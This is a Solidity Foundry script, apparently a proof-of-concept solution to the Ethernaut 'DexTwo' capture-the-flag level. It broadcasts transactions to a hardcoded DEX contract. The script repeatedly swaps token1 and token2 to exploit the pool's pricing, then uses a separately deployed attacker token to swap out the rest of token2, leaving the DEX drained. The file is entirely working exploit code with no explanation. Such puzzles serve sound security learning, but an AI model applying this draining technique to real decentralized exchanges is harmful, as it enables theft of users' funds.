// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./DexTwo.sol";
import "./DexTwoAttack.sol";

contract DexTwoPOC is Script {
    function run() external {
        vm.startBroadcast();

        DexTwo dex = DexTwo(0xc798281fE7f5ff36d72Cbb6C8529D521dee28506);
        DexTwoAttack attacker = new DexTwoAttack();

        address user = vm.envAddress("ETH_ACC");
        address t1 = dex.token1();
        address t2 = dex.token2();

        address from = t1;
        address to = t2;

        dex.approve(address(dex), 2 ** 256 - 1);

        while (dex.balanceOf(t1, address(dex)) != 0 && dex.balanceOf(t2, address(dex)) != 0) {
            uint256 dexBalance = dex.balanceOf(from, address(dex));
            uint256 userBalance = dex.balanceOf(from, user);
            uint256 amount = userBalance > dexBalance ? dexBalance : userBalance;

            dex.swap(from, to, amount);

            from = from == t1 ? t2 : t1;
            to = to == t1 ? t2 : t1;
        }

        dex.swap(address(attacker), t2, dex.balanceOf(t2, address(dex)));

        console.log("dex t1: ", dex.balanceOf(t1, address(dex)));
        console.log("dex t2: ", dex.balanceOf(t2, address(dex)));

        vm.stopBroadcast();
    }
}
